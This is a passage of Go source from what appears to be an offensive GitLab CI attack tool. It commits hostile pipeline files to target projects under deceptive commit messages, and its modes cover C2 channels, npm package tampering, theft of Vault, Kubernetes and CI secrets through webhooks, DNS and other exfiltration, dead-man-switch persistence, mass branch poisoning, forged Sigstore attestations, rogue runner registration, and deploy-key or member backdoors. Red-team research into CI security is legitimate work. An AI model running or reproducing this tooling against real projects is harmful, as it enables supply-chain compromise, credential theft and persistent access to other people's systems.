			target := strings.TrimSpace(atkC2Target)
			if target == "" {
				return fmt.Errorf("--c2-target is required (domain for DNS tunnel, URL for other methods)")
			}
			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = "gogatoz-c2"
			}
			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
			if berr != nil {
				return berr
			}
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			if _, err := att.SetupUser(ctx); err != nil {
				return fmt.Errorf("setup user: %w", err)
			}
			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
				return err
			}
			if strings.TrimSpace(atkMessage) == "" {
				atkMessage = "tools: add network diagnostics"
			}
			var tags []string
			if strings.TrimSpace(atkTags) != "" {
				for t := range strings.SplitSeq(atkTags, ",") {
					t = strings.TrimSpace(t)
					if t != "" {
						tags = append(tags, t)
					}
				}
			}
			if len(tags) == 0 {
				tags = []string{"shell_executor"}
			}
			yaml := payloadgen.GenerateC2ChannelYAML(payloadgen.C2ChannelOptions{
				Common: payloadgen.CommonOptions{
					JobName: strings.TrimSpace(atkJobName),
					Stage:   strings.TrimSpace(atkStage),
					Image:   strings.TrimSpace(atkImage),
					Tags:    tags,
					Manual:  atkManual,
				},
				ExfilMethod: method,
				ExfilTarget: target,
				KeepAlive:   atkC2KeepAlive,
				CallbackURL: strings.TrimSpace(atkC2CallbackURL),
			})
			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
				return fmt.Errorf("commit C2 channel payload: %w", err)
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed C2 channel payload to branch %s\n", finalBranch)
			if outputJSON {
				out := struct {
					Branch      string `json:"branch"`
					ChannelType string `json:"c2_method"`
					Target      string `json:"c2_target"`
					KeepAlive   bool   `json:"keepalive"`
				}{
					Branch:      finalBranch,
					ChannelType: method,
					Target:      target,
					KeepAlive:   atkC2KeepAlive,
				}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("C2 channel payload committed to branch %s", finalBranch))
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Channel type: %s -> %s", method, target))
			return nil
		}

		// npm-tamper mode: inject preinstall hooks into npm packages via CI
		if atkNpmTamper {
			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = "gogatoz-npm-tamper"
			}
			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
			if berr != nil {
				return berr
			}
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			if _, err := att.SetupUser(ctx); err != nil {
				return fmt.Errorf("setup user: %w", err)
			}
			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
				return err
			}
			if strings.TrimSpace(atkMessage) == "" {
				atkMessage = "build: update npm package configuration"
			}
			yaml := payloadgen.GenerateNpmTamperYAML(payloadgen.NpmTamperOptions{
				Common: payloadgen.CommonOptions{
					JobName: strings.TrimSpace(atkJobName),
					Stage:   strings.TrimSpace(atkStage),
					Image:   strings.TrimSpace(atkImage),
					Tags:    parseTags(atkTags),
					Manual:  atkManual,
				},
				RegistryURL:    strings.TrimSpace(atkNpmRegistry),
				PackageName:    strings.TrimSpace(atkNpmPackage),
				InjectedScript: strings.TrimSpace(atkNpmInjectScript),
				CallbackURL:    strings.TrimSpace(atkWebhook),
			})
			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
				return fmt.Errorf("commit npm tamper payload: %w", err)
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed npm tamper payload to branch %s\n", finalBranch)
			if outputJSON {
				out := struct {
					Branch   string `json:"branch"`
					Registry string `json:"registry,omitempty"`
					Package  string `json:"package,omitempty"`
				}{
					Branch:   finalBranch,
					Registry: strings.TrimSpace(atkNpmRegistry),
					Package:  strings.TrimSpace(atkNpmPackage),
				}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("npm tamper payload committed to branch %s", finalBranch))
			return nil
		}

		// vault-enum mode: enumerate and exfiltrate HashiCorp Vault secrets
		if atkVaultEnum { //nolint:dupl // structurally similar to sigstore handler but different YAML generation and JSON output
			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = "gogatoz-vault-enum"
			}
			if strings.TrimSpace(atkMessage) == "" {
				atkMessage = "ci: add vault integration checks"
			}
			yaml := payloadgen.GenerateVaultEnumYAML(payloadgen.VaultEnumOptions{
				Common: payloadgen.CommonOptions{
					JobName: strings.TrimSpace(atkJobName),
					Stage:   strings.TrimSpace(atkStage),
					Image:   strings.TrimSpace(atkImage),
					Tags:    parseTags(atkTags),
					Manual:  atkManual,
				},
				VaultAddr:   strings.TrimSpace(atkVaultAddr),
				AuthMethod:  strings.TrimSpace(atkVaultAuthMethod),
				CallbackURL: strings.TrimSpace(atkWebhook),
			})
			finalBranch, err := commitPayloadToBranch(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail, atkMessage, yaml)
			if err != nil {
				return fmt.Errorf("commit vault enum payload: %w", err)
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed vault enum payload to branch %s\n", finalBranch)
			if outputJSON {
				out := struct {
					Branch     string `json:"branch"`
					VaultAddr  string `json:"vault_addr,omitempty"`
					AuthMethod string `json:"auth_method,omitempty"`
				}{
					Branch:     finalBranch,
					VaultAddr:  strings.TrimSpace(atkVaultAddr),
					AuthMethod: strings.TrimSpace(atkVaultAuthMethod),
				}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Vault enum payload committed to branch %s", finalBranch))
			return nil
		}

		// k8s-secrets mode: sweep Kubernetes secrets via runner pod service account
		if atkK8sSecrets {
			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = "gogatoz-k8s-secrets"
			}
			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
			if berr != nil {
				return berr
			}
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			if _, err := att.SetupUser(ctx); err != nil {
				return fmt.Errorf("setup user: %w", err)
			}
			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
				return err
			}
			if strings.TrimSpace(atkMessage) == "" {
				atkMessage = "ci: add kubernetes integration tests"
			}
			var ns []string
			if s := strings.TrimSpace(atkK8sNamespaces); s != "" {
				for n := range strings.SplitSeq(s, ",") {
					n = strings.TrimSpace(n)
					if n != "" {
						ns = append(ns, n)
					}
				}
			}
			yaml := payloadgen.GenerateK8sSecretsYAML(payloadgen.K8sSecretsOptions{
				Common: payloadgen.CommonOptions{
					JobName: strings.TrimSpace(atkJobName),
					Stage:   strings.TrimSpace(atkStage),
					Image:   strings.TrimSpace(atkImage),
					Tags:    parseTags(atkTags),
					Manual:  atkManual,
				},
				Namespaces:  ns,
				CallbackURL: strings.TrimSpace(atkWebhook),
			})
			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
				return fmt.Errorf("commit k8s secrets payload: %w", err)
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed k8s secrets payload to branch %s\n", finalBranch)
			if outputJSON {
				out := struct {
					Branch     string   `json:"branch"`
					Namespaces []string `json:"namespaces,omitempty"`
				}{
					Branch:     finalBranch,
					Namespaces: ns,
				}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("K8s secrets payload committed to branch %s", finalBranch))
			return nil
		}

		// dead-man-switch mode: install persistence with token revocation detection
		if atkDeadManSwitch {
			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = "gogatoz-dms"
			}
			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
			if berr != nil {
				return berr
			}
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			if _, err := att.SetupUser(ctx); err != nil {
				return fmt.Errorf("setup user: %w", err)
			}
			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
				return err
			}
			if strings.TrimSpace(atkMessage) == "" {
				atkMessage = "ci: add health monitoring"
			}
			yaml := payloadgen.GenerateDeadManSwitchYAML(payloadgen.DeadManSwitchOptions{
				Common: payloadgen.CommonOptions{
					JobName: strings.TrimSpace(atkJobName),
					Stage:   strings.TrimSpace(atkStage),
					Image:   strings.TrimSpace(atkImage),
					Tags:    parseTags(atkTags),
					Manual:  atkManual,
				},
				MonitorURL:    strings.TrimSpace(atkDMSMonitorURL),
				CheckInterval: strings.TrimSpace(atkDMSInterval),
				TTL:           strings.TrimSpace(atkDMSTTL),
				Handler:       strings.TrimSpace(atkDMSHandler),
				Platform:      strings.TrimSpace(atkDMSPlatform),
			})
			if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
				return fmt.Errorf("commit dead man switch payload: %w", err)
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed dead man switch payload to branch %s\n", finalBranch)
			if outputJSON {
				out := struct {
					Branch   string `json:"branch"`
					Platform string `json:"platform,omitempty"`
					Handler  string `json:"handler,omitempty"`
				}{
					Branch:   finalBranch,
					Platform: strings.TrimSpace(atkDMSPlatform),
					Handler:  strings.TrimSpace(atkDMSHandler),
				}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Dead Man's Switch payload committed to branch %s", finalBranch))
			return nil
		}

		// branch-mutator mode: mass branch CI poisoning via GitLab SDK
		if atkBranchMutator {
			content := strings.TrimSpace(atkMutatorContent)
			if content == "" {
				// Generate a default CI payload if no content provided
				ci, cerr := renderPayload()
				if cerr == nil && strings.TrimSpace(ci) != "" {
					content = ci
				}
			}
			if content == "" {
				content = "stages: [test]\nmutated:\n  stage: test\n  script: [echo mutated]\n"
			}
			maxBranches := atkMutatorMaxBranches
			if maxBranches <= 0 {
				maxBranches = 10
			}
			opts := payloadgen.BranchMutatorOptions{
				FilePath:    strings.TrimSpace(atkMutatorFile),
				FileContent: content,
				MaxBranches: maxBranches,
				CallbackURL: strings.TrimSpace(atkWebhook),
			}
			result := payloadgen.RunBranchMutator(ctx, client.GL, atkTarget, opts, atkAuthorName, atkAuthorEmail, cmd.ErrOrStderr())
			if outputJSON {
				b, _ := json.MarshalIndent(result, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Branch mutator: %d/%d branches mutated", result.Mutated, result.Targeted))
			if result.Errors > 0 {
				renderWarning(cmd.OutOrStdout(), fmt.Sprintf("%d errors encountered", result.Errors))
			}
			return nil
		}

		// sigstore mode: forge Sigstore provenance attestations
		if atkSigstore { //nolint:dupl // structurally similar to vault-enum handler but different YAML generation and JSON output
			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = "gogatoz-sigstore"
			}
			if strings.TrimSpace(atkMessage) == "" {
				atkMessage = "ci: add provenance attestation"
			}
			yaml := payloadgen.GenerateSigstoreYAML(payloadgen.SigstoreOptions{
				Common: payloadgen.CommonOptions{
					JobName: strings.TrimSpace(atkJobName),
					Stage:   strings.TrimSpace(atkStage),
					Image:   strings.TrimSpace(atkImage),
					Tags:    parseTags(atkTags),
					Manual:  atkManual,
				},
				PackageName: strings.TrimSpace(atkSigstorePackage),
				Version:     strings.TrimSpace(atkSigstoreVersion),
				CallbackURL: strings.TrimSpace(atkWebhook),
			})
			finalBranch, err := commitPayloadToBranch(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail, atkMessage, yaml)
			if err != nil {
				return fmt.Errorf("commit sigstore payload: %w", err)
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed sigstore provenance payload to branch %s\n", finalBranch)
			if outputJSON {
				out := struct {
					Branch      string `json:"branch"`
					PackageName string `json:"package_name,omitempty"`
					Version     string `json:"version,omitempty"`
				}{
					Branch:      finalBranch,
					PackageName: strings.TrimSpace(atkSigstorePackage),
					Version:     strings.TrimSpace(atkSigstoreVersion),
				}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Sigstore provenance payload committed to branch %s", finalBranch))
			return nil
		}

		// secrets mode
		if atkSecrets {
			// parse tags
			var tags []string
			if strings.TrimSpace(atkTags) != "" {
				for t := range strings.SplitSeq(atkTags, ",") {
					t = strings.TrimSpace(t)
					if t != "" {
						tags = append(tags, t)
					}
				}
			}
			var pubkey string
			if strings.TrimSpace(atkPubkeyFile) != "" {
				b, err := os.ReadFile(strings.TrimSpace(atkPubkeyFile))
				if err != nil {
					return fmt.Errorf("read --pubkey-file: %w", err)
				}
				pubkey = string(b)
			}
			var privkeyPEM []byte
			if strings.TrimSpace(atkPrivkeyFile) != "" {
				b, err := os.ReadFile(strings.TrimSpace(atkPrivkeyFile))
				if err != nil {
					return fmt.Errorf("read --privkey-file: %w", err)
				}
				privkeyPEM = b
			}
			sr := newSecretsRunner(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			exfil := attack.ExfilOptions{Method: atkExfilMethod, Target: atkExfilTarget}
			url, exfilJobNameUsed, err := sr.RunExfil(ctx, atkTarget, atkBranch, pubkey, tags, exfil)
			if err != nil {
				return err
			}
			// Give GitLab a moment to process the commit before querying pipelines.
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", url)

			// Wait for the exfiltrate job, download artifacts, and decrypt — default for artifact method.
			var (
				exfilSecrets map[string]string
				exfilJobID   int64
				exfilStatus  string
				pipelineID   int64
			)
			exfilMethod := strings.ToLower(strings.TrimSpace(atkExfilMethod))
			if !atkNoWait && (exfilMethod == "" || exfilMethod == "artifact") {
				// In JSON mode write progress to stderr so stdout stays clean JSON.
				progressW := cmd.OutOrStdout()
				if outputJSON {
					progressW = cmd.ErrOrStderr()
				}
				stdout := progressW
				renderInfo(stdout, fmt.Sprintf("waiting for exfiltrate job (timeout: %s)...", atkWaitTimeout))
				// WaitForExfilPipeline scans the 5 most recent pipelines on the branch each tick,
				// so it correctly finds the exfil pipeline even when the branch-creation pipeline
				// (triggered by EnsureBranch) appears first and contains no "exfiltrate" job.
				pipelineID, exfilJobID, exfilStatus, _ = attack.WaitForExfilPipeline(ctx, client, atkTarget, atkBranch, exfilJobNameUsed, 5*time.Second, atkWaitTimeout)
				if pipelineID > 0 {
					url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(gitlabURL, "/"), atkTarget, pipelineID)
				}
				switch exfilStatus {
				case "success":
					zipBytes, zerr := secdump.DownloadJobArtifactsZIP(ctx, client, atkTarget, exfilJobID)
					if zerr != nil {
						renderWarning(stdout, fmt.Sprintf("artifact download failed: %v", zerr))
					} else {
						sJSON, sEnc, aEnc, _ := secdump.ExtractExfilFiles(zipBytes)
						if len(privkeyPEM) > 0 && len(sEnc) > 0 && len(aEnc) > 0 {
							exfilSecrets, err = secdump.DecryptExfilArtifacts(privkeyPEM, sEnc, aEnc)
							if err != nil {
								renderWarning(stdout, fmt.Sprintf("decrypt failed: %v", err))
							}
						} else if len(sJSON) > 0 {
							_ = json.Unmarshal(sJSON, &exfilSecrets)
						}
					}
				case "":
					renderWarning(stdout, "exfiltrate job not found or timed out")
				default:
					renderWarning(stdout, fmt.Sprintf("exfiltrate job status: %s", exfilStatus))
				}
				if len(exfilSecrets) > 0 {
					renderExfilSecrets(stdout, exfilSecrets, atkAllVars)
					persistAttackExfil(strings.TrimSpace(gitlabURL), atkTarget, 0, "", atkBranch, url, pipelineID, exfilJobID, exfilSecrets)
				}
			}

			if outputJSON {
				out := secretsOutput{PipelineURL: url, JobID: exfilJobID, JobStatus: exfilStatus, ExfilSecrets: exfilSecrets}
				if atkWithProjVars {
					pv, err := secdump.ListProjectVariables(ctx, client, atkTarget, atkIncludeProtected)
					if err != nil {
						return fmt.Errorf("list project variables: %w", err)
					}
					out.ProjectVariables = pv
				}
				if atkWithGroupVars {
					gid := strings.TrimSpace(atkGroupID)
					if gid == "" {
						return fmt.Errorf("--group-vars requires --group-id (group numeric ID or full path)")
					}
					gv, err := secdump.ListGroupVariables(ctx, client, gid, atkIncludeProtected)
					if err != nil {
						return fmt.Errorf("list group variables: %w", err)
					}
					out.GroupVariables = gv
				}
				if atkLogs {
					finds, _ := secdump.ScrapeJobLogs(ctx, client, atkTarget, strings.TrimSpace(atkLogsRef), atkLogsMaxPipelines, atkLogsMaxJobs)
					if len(finds) > 0 {
						out.LogFindings = finds
					}
				}
				if atkArtifacts {
					afinds, _ := secdump.ScrapeArtifacts(ctx, client, atkTarget, strings.TrimSpace(atkArtifactsRef), atkArtifactsMaxPipelines, atkArtifactsMaxJobs, atkArtifactsMaxZipBytes, atkArtifactsMaxFileBytes)
					if len(afinds) > 0 {
						out.ArtifactFindings = afinds
					}
				}
				b, err := json.MarshalIndent(out, "", "  ")
				if err != nil {
					return fmt.Errorf("encode json: %w", err)
				}
				_, err = fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Pipeline URL: %s", url))
			return nil
		}

		// commit-ci mode
		// Validate CI content source: allow exactly one of --ci-yaml, --ci-file, --ci-stdin, or --payload
		sources := 0
		if strings.TrimSpace(atkCIInline) != "" {
			sources++
		}
		if strings.TrimSpace(atkCIFile) != "" {
			sources++
		}
		if atkCIStdin {
			sources++
		}
		if strings.TrimSpace(atkPayload) != "" {
			sources++
		}
		if sources != 1 {
			return fmt.Errorf("provide exactly one CI content source: --ci-yaml, --ci-file, --ci-stdin, or --payload")
		}
		// Auto-select runner tags for ror payload if not provided
		if strings.TrimSpace(atkPayload) != "" {
			lp := strings.ToLower(strings.TrimSpace(atkPayload))
			if (lp == payloadRor || lp == payloadRunnerOnRunner || lp == payloadRunnerOnRunnerAlt) && strings.TrimSpace(atkTags) == "" {
				tags, _, derr := rorpkg.DiscoverProjectRunnerTags(ctx, client, atkTarget)
				if derr == nil {
					if strings.TrimSpace(atkExecutor) != "" {
						tags = rorpkg.FilterTagsByExecutor(tags, atkExecutor)
					}
					if len(tags) > 0 {
						atkTags = strings.Join(tags, ",")
					}
				}
			}
		}
		var ci string
		if strings.TrimSpace(atkPayload) != "" {
			ci, err = renderPayload()
		} else {
			ci, err = loadCIContent(atkCIInline, atkCIFile, atkCIStdin)
		}
		if err != nil {
			return err
		}
		if strings.TrimSpace(ci) == "" {
			return errors.New("empty CI content")
		}

		// Deconflict strategy for branch staging
		if strings.TrimSpace(atkBranch) == "" {
			atkBranch = attack.GogatozAttacks
		}
		finalBranch, err := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
		if err != nil {
			return err
		}
		att := newAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
		url, err := att.CommitCIPipeline(ctx, atkTarget, finalBranch, ci, atkMessage)
		if err != nil {
			return err
		}
		// Try to resolve actual pipeline ID for a better URL
		pipelineID, waitErr := attack.WaitForPipelineForRef(ctx, client, atkTarget, finalBranch, 0, 2*time.Second, 30*time.Second)
		if waitErr == nil && pipelineID > 0 {
			url = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(gitlabURL, "/"), atkTarget, pipelineID)
		}
		fmt.Fprintf(cmd.ErrOrStderr(), "[attack] pipeline: %s\n", url)

		// Optionally create a merge request after committing CI
		var mrURL string
		var mrIID int64
		if atkCreateMR {
			realAtt := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			mr, mrErr := realAtt.CreateMergeRequest(ctx, atkTarget, finalBranch, atkMRTargetBranch, atkMRTitle, atkMRDescription)
			if mrErr != nil {
				return fmt.Errorf("create merge request: %w", mrErr)
			}
			mrURL = mr.WebURL
			mrIID = mr.IID
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] merge request: %s\n", mrURL)
		}

		if outputJSON {
			out := struct {
				PipelineURL     string `json:"pipeline_url"`
				Branch          string `json:"branch"`
				PipelineID      int64  `json:"pipeline_id"`
				MergeRequestURL string `json:"merge_request_url,omitempty"`
				MergeRequestIID int64  `json:"merge_request_iid,omitempty"`
			}{
				PipelineURL:     url,
				Branch:          finalBranch,
				PipelineID:      pipelineID,
				MergeRequestURL: mrURL,
				MergeRequestIID: mrIID,
			}
			b, _ := json.MarshalIndent(out, "", "  ")
			_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
			return err
		}
		renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Pipeline URL: %s (branch %s)", url, finalBranch))
		if mrURL != "" {
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Merge Request: %s", mrURL))
		}
		return nil
	},
}

func init() {
	rootCmd.AddCommand(attackCmd)
	attackCmd.Flags().StringVarP(&atkTarget, "target", "t", "", "Target project (ID or path-with-namespace)")
	attackCmd.Flags().BoolVar(&atkCommitCI, "commit-ci", false, "Commit a .gitlab-ci.yml to the target repo")
	attackCmd.Flags().StringVar(&atkBranch, "branch", "", "Branch to commit the CI to (default: gogatoz-attack)")
	attackCmd.Flags().StringVar(&atkMessage, "message", "", "Commit message (optional)")
	attackCmd.Flags().StringVar(&atkAuthorName, "author-name", "", "Commit author name (optional; defaults to current user)")
	attackCmd.Flags().StringVar(&atkAuthorEmail, "author-email", "", "Commit author email (optional)")
	// CI content sources
	attackCmd.Flags().StringVar(&atkCIInline, "ci-yaml", "", "Inline CI YAML content")
	attackCmd.Flags().StringVar(&atkCIFile, "ci-file", "", "Path to CI YAML file to read")
	attackCmd.Flags().BoolVar(&atkCIStdin, "ci-stdin", false, "Read CI YAML content from stdin")
	// Mode: secrets exfiltration
	attackCmd.Flags().BoolVar(&atkSecrets, "secrets", false, "Run secrets exfiltration attack (commits exfiltration CI)")
	attackCmd.Flags().StringVar(&atkPubkeyFile, "pubkey-file", "", "Path to RSA public key to encrypt exfiltrated data (optional)")
	// Payload rendering flags
	attackCmd.Flags().StringVar(&atkPayload, "payload", "", "Payload: ror-shell|pwn-request|ror|runner-on-runner|secrets|secrets-exfil|git-hook|cache-poison (use with --payload-only or as CI source with --commit-ci)")
	attackCmd.Flags().BoolVar(&atkPayloadOnly, "payload-only", false, "Render the selected payload YAML to stdout and exit")
	attackCmd.Flags().StringVar(&atkJobName, "job-name", "", "Payload job name (optional)")
	attackCmd.Flags().StringVar(&atkStage, "stage", "", "Payload stage name (optional; default 'attack')")
	attackCmd.Flags().StringVar(&atkTags, "tags", "", "Comma-separated runner tags for the payload job or secrets mode")
	attackCmd.Flags().StringVar(&atkImage, "image", "", "Docker image for the payload job (optional)")
	attackCmd.Flags().BoolVar(&atkManual, "manual", false, "Add a manual rule to the payload job")
	attackCmd.Flags().StringVar(&atkArtifactsPath, "artifacts-path", "", "Artifacts path to upload (optional)")
	attackCmd.Flags().StringVar(&atkArtifactsExpire, "artifacts-expire", "", "Artifacts expire_in (e.g., 1 day)")
	// ror-shell specific
	attackCmd.Flags().StringVar(&atkCmd, "cmd", "", "Command for ror-shell payload (default: 'id; uname -a')")
	attackCmd.Flags().StringVar(&atkDownload, "download", "", "Download a file instead of running a command (ror-shell)")
	// pwn-request specific
	attackCmd.Flags().StringVar(&atkTargetBranchRegex, "target-branch-regex", "", "Regex for target branch name condition (pwn-request)")
	// runner-on-runner specific
	attackCmd.Flags().StringVar(&atkScriptURL, "script-url", "", "Remote script URL to execute (runner-on-runner)")
	attackCmd.Flags().StringVar(&atkOS, "os", "linux", "Target OS for runner-on-runner payload: linux|windows|macos")
	attackCmd.Flags().IntVar(&atkKeepAlive, "keepalive", 0, "Keep job alive by emitting heartbeat every N seconds (runner-on-runner payload)")
	// nested-runner specific
	attackCmd.Flags().StringVar(&atkNestedGitLabURL, "nested-gitlab-url", "", "Attacker-controlled GitLab URL for rogue runner registration (nested-runner)")
	attackCmd.Flags().StringVar(&atkNestedRegToken, "nested-reg-token", "", "Runner registration token from attacker's GitLab (nested-runner)")
	attackCmd.Flags().StringVar(&atkNestedName, "nested-name", "", "Name for the rogue runner (default: rogue-runner)")
	attackCmd.Flags().StringVar(&atkNestedTags, "nested-tags", "", "Comma-separated tags for the rogue runner (default: rogue)")
	attackCmd.Flags().StringVar(&atkNestedExecutor, "nested-executor", "", "Executor for the rogue runner: shell|docker (default: shell)")
	attackCmd.Flags().StringVar(&atkNestedCallback, "nested-callback", "", "URL to POST confirmation when rogue runner is registered")
	attackCmd.Flags().StringVar(&atkNestedVersion, "nested-version", "", "gitlab-runner version to download (default: latest)")
	// discovery and targeting
	attackCmd.Flags().BoolVar(&atkDiscoverTags, "discover-tags", false, "Discover runner tags for the target project and exit")
	attackCmd.Flags().StringVar(&atkExecutor, "executor", "", "Filter discovered tags by executor hint (docker|shell|kubernetes)")
	// secrets exfil specific (payload rendering path)
	attackCmd.Flags().StringVar(&atkWebhook, "webhook", "", "Webhook URL to POST env dump for secrets payload (payload mode)")
	attackCmd.Flags().StringVar(&atkExfilMethod, "exfil-method", "artifact", "Exfiltration method: artifact|http|dns|icmp|git|cloud")
	attackCmd.Flags().StringVar(&atkExfilTarget, "exfil-target", "", "Exfil target (URL, domain, IP, or git repo URL depending on method)")
	attackCmd.Flags().StringVar(&atkPrivkeyFile, "privkey-file", "", "RSA private key PEM for decrypting exfil artifacts (pairs with --pubkey-file)")
	attackCmd.Flags().BoolVar(&atkNoWait, "no-wait", false, "Skip waiting for the exfiltrate job to finish (disables artifact download, decrypt, and DB store)")
	attackCmd.Flags().BoolVar(&atkAllVars, "all-vars", false, "Show all exfiltrated variables including GitLab CI built-ins and OS variables (default: filtered)")
	attackCmd.Flags().DurationVar(&atkWaitTimeout, "wait-timeout", 5*time.Minute, "Max time to wait for the exfiltrate job to complete (default: 5m)")
	// secrets API dump options (for --secrets JSON output)
	attackCmd.Flags().BoolVar(&atkWithProjVars, "project-vars", false, "Include project variables in JSON output for --secrets")
	attackCmd.Flags().BoolVar(&atkWithGroupVars, "group-vars", false, "Include group variables in JSON output for --secrets")
	attackCmd.Flags().StringVar(&atkGroupID, "group-id", "", "Group ID or full path for --group-vars")
	attackCmd.Flags().BoolVar(&atkIncludeProtected, "include-protected", false, "Include protected variables when listing variables")
	attackCmd.Flags().BoolVar(&atkLogs, "logs", false, "Scrape recent job logs for key=value findings in --secrets JSON output")
	attackCmd.Flags().StringVar(&atkLogsRef, "logs-ref", "", "Ref/branch to limit pipeline selection for logs scraping (optional)")
	attackCmd.Flags().IntVar(&atkLogsMaxPipelines, "logs-max-pipelines", 3, "Max pipelines to inspect for logs scraping (default: 3)")
	attackCmd.Flags().IntVar(&atkLogsMaxJobs, "logs-max-jobs", 20, "Max jobs per pipeline to scan logs for (default: 20)")
	// secrets artifacts scraping flags
	attackCmd.Flags().BoolVar(&atkArtifacts, "artifacts", false, "Scrape recent job artifacts for key=value findings in --secrets JSON output")
	attackCmd.Flags().StringVar(&atkArtifactsRef, "artifacts-ref", "", "Ref/branch to limit pipeline selection for artifacts scraping (optional)")
	attackCmd.Flags().IntVar(&atkArtifactsMaxPipelines, "artifacts-max-pipelines", 2, "Max pipelines to inspect for artifacts scraping (default: 2)")
	attackCmd.Flags().IntVar(&atkArtifactsMaxJobs, "artifacts-max-jobs", 10, "Max jobs per pipeline to fetch artifacts for (default: 10)")
	attackCmd.Flags().Int64Var(&atkArtifactsMaxZipBytes, "artifacts-max-zip-bytes", 16777216, "Max bytes for an artifacts ZIP to download (default: 16MiB)")
	attackCmd.Flags().IntVar(&atkArtifactsMaxFileBytes, "artifacts-max-file-bytes", 262144, "Max bytes to scan per file inside artifacts (default: 256KiB)")
	// Branch deconflict strategy
	attackCmd.Flags().StringVar(&atkDeconflict, "deconflict", "fail", "Branch deconflict strategy: fail|suffix|force (default: fail)")
	// Persistence modes
	attackCmd.Flags().BoolVar(&atkDeployKey, "deploy-key", false, "Create a deploy key with write access on the target project")
	attackCmd.Flags().StringVar(&atkKeyTitle, "key-title", "", "Title for the deploy key (default: 'GoGatoZ Deploy Key')")
	attackCmd.Flags().StringVar(&atkKeyPath, "key-path", "", "Path to save the generated private key (required for --deploy-key)")
	attackCmd.Flags().BoolVar(&atkAddMember, "add-member", false, "Add a user as project member")
	attackCmd.Flags().StringVar(&atkMemberUser, "member-username", "", "Username to add as project member")
	attackCmd.Flags().StringVar(&atkMemberRole, "member-role", "", "Access level: guest|reporter|developer|maintainer (default: developer)")
	// MR creation flags (used with --commit-ci or --ai-inject)
	attackCmd.Flags().BoolVar(&atkCreateMR, "create-mr", false, "Create a merge request after committing CI or AI config file")
